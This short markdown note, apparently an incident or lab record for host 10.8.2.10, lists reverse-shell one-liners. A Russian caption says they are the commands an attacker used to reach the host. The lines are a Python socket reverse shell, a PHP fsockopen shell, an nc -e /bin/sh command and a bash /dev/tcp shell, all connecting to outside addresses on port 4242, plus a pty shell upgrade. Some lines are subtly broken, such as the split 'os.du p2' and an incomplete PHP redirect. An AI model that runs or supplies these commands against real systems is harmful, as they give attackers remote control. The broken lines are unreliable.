# NightmareFuel
## Хост 10.8.2.10
```bash
python3 -c "import pty; pty.spawn('/bin/bash')"
```

```bash
python -c 'import socket, os, pty; \
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM); \
s.connect(("10.8.5.12", 4242)); \
os.dup2(s.fileno(), 0); \
os.dup2(s.fileno(), 1); \
os.du p2(s.fileno(), 2); \
pty.spawn("/bin/sh")'
```
---
Команды, с помощью которых злоумышленник получил доступ к хосту
```bash
php -r '$sock=fsockopen("10.0.0.1", 4242);exec("/bin/sh -i <")'
```
```bash
nc -e /bin/sh 10.8.5.12 4242
```
```bash
bash -i >& /dev/tcp/10.8.5.12/4242 0>&1
```



